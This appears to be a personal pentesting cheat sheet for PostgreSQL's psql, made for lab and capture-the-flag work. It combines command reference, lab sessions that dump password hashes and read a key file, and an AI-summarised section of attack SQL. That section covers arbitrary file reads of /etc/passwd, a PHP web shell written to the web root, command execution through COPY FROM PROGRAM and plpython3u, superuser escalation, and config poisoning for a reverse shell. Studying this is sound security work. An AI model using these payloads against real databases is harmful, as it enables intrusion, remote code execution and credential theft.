
`psql` to start postgres

`\list` to list the databases
`\c [DATABASE]` to select the database `[DATABASE]`
`\d` to list the tables
Use `SELECT` to find the data

### Basic Commands

The `psql` command-line utility uses short commands starting with a backslash (`\`) to manage your database.

Help and Navigation

- **`\?`** Show help for all backslash commands.
- **`\h [command]`** Show help for a specific SQL command syntax (e.g., `\h CREATE TABLE`).
- **`\q`** Quit and exit the `psql` prompt.

Exploration and Listing (The "d" Commands)

- **`\l`** List all databases on the server.
- **`\c [database_name]`** Connect to a different database.
- **`\dt`** List all tables in the current database.
- **`\d [table_name]`** Show a specific table's structure, columns, types, and indexes.
- **`\dv`** List all views.
- **`\df`** List all functions.
- **`\dn`** List all schemas.
- **`\du`** List all users and their roles/privileges.

Formatting and Output

- **`\x`** Toggle expanded display mode (useful for viewing wide rows vertically).
- **`\a`** Toggle between aligned and unaligned output formatting.
- **`\t`** Toggle printing only rows (hides column headers and row count footers).

System and File Operations

- **`\i [file_path]`** Execute SQL commands from an external file.
- **`\o [file_path]`** Send all future query results to a file instead of the screen.
- **`\! [command]`** Run a shell command in your host operating system without leaving `psql`.
- **`\e`** Open the current query buffer in an external text editor (like Vim or Nano).

### Examples

```sh
postgres@75dc5cab44d1:/home/pentesterlab$ psql
psql (9.4.15)
Type "help" for help.
postgres=# \list
                               List of databases
     Name     |  Owner   | Encoding  | Collate | Ctype |   Access privileges   
--------------+----------+-----------+---------+-------+-----------------------
 pentesterlab | postgres | SQL_ASCII | C       | C     | 
 postgres     | postgres | SQL_ASCII | C       | C     | 
 template0    | postgres | SQL_ASCII | C       | C     | =c/postgres          +
              |          |           |         |       | postgres=CTc/postgres
 template1    | postgres | SQL_ASCII | C       | C     | =c/postgres          +
              |          |           |         |       | postgres=CTc/postgres
(4 rows)
postgres=# \c pentesterlab
You are now connected to database "pentesterlab" as user "postgres".
pentesterlab=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | users | table | postgres
(1 row)
pentesterlab=# select * from users;
 login |               password               
-------+--------------------------------------
 admin | c3a2fb1c-c0d9-418b-9e36-ed098ff6ee4b
(1 row)
pentesterlab=# 
```

```sh
pentesterlab@68fff71b137f:/var/www$ psql photoblog photoblog
Password for user photoblog: 
psql (9.4.26)
Type "help" for help.
photoblog=# \d
                List of relations
 Schema |       Name        |   Type   |  Owner   
--------+-------------------+----------+----------
 public | categories        | table    | postgres
 public | categories_id_seq | sequence | postgres
 public | pictures          | table    | postgres
 public | pictures_id_seq   | sequence | postgres
 public | users             | table    | postgres
 public | users_id_seq      | sequence | postgres
(6 rows)
photoblog=# select * from users;
 id | login |             password             
----+-------+----------------------------------
  1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2
(1 row)
photoblog=# create table demo(t text);
CREATE TABLE
photoblog=# copy demo from '/var/lib/postgresql/9.4/key.txt';
COPY 1
photoblog=# 
photoblog=# select * from demo;
                  t                   
--------------------------------------
 25eb9d43-416e-4d3e-9dd3-a7a707380bdb
(1 row)
photoblog=# drop table demo;
DROP TABLE
photoblog=# 
```

### Vulnerabilities (AI summarized)

When attacking or defending a machine on platforms like Hack The Box, PostgreSQL misconfigurations and built-in features are frequently utilized to transition from database access to a Remote Code Execution (RCE) shell, or to escalate privileges.

The primary vector hinges on the **PostgreSQL role permissions** assigned to the compromised user account.

1. File Read/Write Exploitation (Pre-requisite for RCE)

If a user has the `pg_read_server_files` or `pg_write_server_files` default roles (or is a `SUPERUSER`), they can interact directly with the underlying operating system's filesystem.

- **Reading Arbitrary Files:**  
    You can read internal system files (like configuration files, source code, or SSH private keys) by pulling them into a staging table:
    ```sql
    CREATE TABLE staging(content TEXT);
    COPY staging FROM '/etc/passwd';
    SELECT * FROM staging;
    ```
    
- **Writing Arbitrary Files:**  
    You can write web shells or inject lines into configuration files if the `postgres` system user has write permissions to those directories:
    ```sql
    COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
    ```
    
2. Command Execution via System Functionality (RCE)

If an account has `SUPERUSER` privileges, there are several methods used to break out of the SQL context into operating system command execution.

- **The `COPY ... PROGRAM` Technique (Most Common HTB Vector):**  
    Introduced in Postgres 9.3, the `COPY` command allows execution of an OS shell command directly, piping the output back into a table.
    ```sql
    CREATE TABLE exec_out(cmd_output TEXT);
    COPY exec_out FROM PROGRAM 'id; whoami; uname -a';
    SELECT * FROM exec_out;
    ```
    _Note: This can be weaponized into a reverse shell by passing a netcat, bash, or python payload into the `PROGRAM` string._

- **User-Defined Functions (UDF) via Untrusted Languages:**  
    If Python or Perl are installed as trusted/untrusted languages within the database engine (e.g., `plpython3u`), a superuser can create a function that executes OS commands natively.
    ```sql
    CREATE EXTENSION plpython3u;
    CREATE OR REPLACE FUNCTION sys_eval(cmd text) RETURNS text AS $$
        import os
        return os.popen(cmd).read()
    $$ LANGUAGE plpython3u;
    SELECT sys_eval('whoami');
    ```

3. Privilege Escalation Inside the Database

If you gain access as a low-privileged database user, look for flaws that allow you to escalate to a database `SUPERUSER`.

- **Abusing `SECURITY DEFINER` Functions:**  
    By default, functions execute with the privileges of the user calling them (`SECURITY INVOKER`). However, if a developer creates a function using `SECURITY DEFINER`, it runs with the privileges of the user who _created_ it (often a superuser). If that function accepts string input without sanitization or allows dynamic execution, it can be abused to run queries as a superuser.
    
- **The `ALTER USER ... SUPERUSER` Injection:**  
    If you find a SQL injection or a vulnerable `SECURITY DEFINER` function executing administrative tasks, the payload to elevate your own account is:
    ```sql
    ALTER USER your_low_priv_user WITH SUPERUSER;
    ```

4. Uncommon or Version-Specific Vulnerabilities

In CTFs with older or deliberately unpatched infrastructure, watch out for these specialized flaws:

- **`pg_cron` Extension Exploitation (CVE-2025-1094 / Historical):**  
    If the target uses the popular `pg_cron` extension, low-privileged users with ownership over the cron job tables could manipulate the primary keys or change the execution database names to run scheduled queries as a superuser.
    
- **Materialized View Escalation (CVE-2024-0985):**  
    In older Postgres 15/16 instances, a late privilege drop flaw allowed an attacker to create a specially crafted materialized view. When a superuser was tricked into running `REFRESH MATERIALIZED VIEW CONCURRENTLY` on it, the creator's custom malicious SQL functions executed with the superuser's context.
    
- **Config Poisoning via `pg_reload_conf()`:**  
    If you can modify the `postgresql.conf` file via a write primitive but do not have full system access, you can add `session_preload_libraries = 'payload.so'` and execute `SELECT pg_reload_conf();` to trigger a reverse shell upon the next database connection.

5. Transitioning from Database User to OS Root

Once you achieve RCE via Postgres, you will typically land as the `postgres` service account on the Linux system. To escalate to `root`:

- Check for local misconfigurations specific to the `postgres` user.
- Run `sudo -l` to see if the `postgres` user can execute any system binaries without a password.
- Check for historical local privilege escalation flaws involving Debian/Ubuntu database management scripts, such as `pg_ctlcluster` (CVE-2019-3466), which allowed the `postgres` user to create arbitrary symlinks during cluster reloads to gain root access.

Links:
https://www.offsec.com/blog/postgresql-exploit/
https://medium.com/@lordhorcrux_/ultimate-guide-postgresql-pentesting-989055d5551e
https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/
https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html
https://github.com/google/security-research/security/advisories/GHSA-j8p5-79jf-g575
https://saites.dev/projects/personal/postgres-cve-2024-0985/
https://www.sentinelone.com/vulnerability-database/cve-2024-0985/
https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/

### Help

```sh
pentesterlab@68fff71b137f:/var/www$ psql --help
psql is the PostgreSQL interactive terminal.
Usage:
  psql [OPTION]... [DBNAME [USERNAME]]
General options:
  -c, --command=COMMAND    run only single command (SQL or internal) and exit
  -d, --dbname=DBNAME      database name to connect to (default: "pentesterlab")
  -f, --file=FILENAME      execute commands from file, then exit
  -l, --list               list available databases, then exit
  -v, --set=, --variable=NAME=VALUE
                           set psql variable NAME to VALUE
  -V, --version            output version information, then exit
  -X, --no-psqlrc          do not read startup file (~/.psqlrc)
  -1 ("one"), --single-transaction
                           execute as a single transaction (if non-interactive)
  -?, --help               show this help, then exit
Input and output options:
  -a, --echo-all           echo all input from script
  -e, --echo-queries       echo commands sent to server
  -E, --echo-hidden        display queries that internal commands generate
  -L, --log-file=FILENAME  send session log to file
  -n, --no-readline        disable enhanced command line editing (readline)
  -o, --output=FILENAME    send query results to file (or |pipe)
  -q, --quiet              run quietly (no messages, only query output)
  -s, --single-step        single-step mode (confirm each query)
  -S, --single-line        single-line mode (end of line terminates SQL command)
Output format options:
  -A, --no-align           unaligned table output mode
  -F, --field-separator=STRING
                           field separator for unaligned output (default: "|")
  -H, --html               HTML table output mode
  -P, --pset=VAR[=ARG]     set printing option VAR to ARG (see \pset command)
  -R, --record-separator=STRING
                           record separator for unaligned output (default: newline)
  -t, --tuples-only        print rows only
  -T, --table-attr=TEXT    set HTML table tag attributes (e.g., width, border)
  -x, --expanded           turn on expanded table output
  -z, --field-separator-zero
                           set field separator for unaligned output to zero byte
  -0, --record-separator-zero
                           set record separator for unaligned output to zero byte

Connection options:
  -h, --host=HOSTNAME      database server host or socket directory (default: "/var/run/postgresql")
  -p, --port=PORT          database server port (default: "5432")
  -U, --username=USERNAME  database user name (default: "pentesterlab")
  -w, --no-password        never prompt for password
  -W, --password           force password prompt (should happen automatically)

For more information, type "\?" (for internal commands) or "\help" (for SQL
commands) from within psql, or consult the psql section in the PostgreSQL
documentation.
Report bugs to <pgsql-bugs@postgresql.org>.
```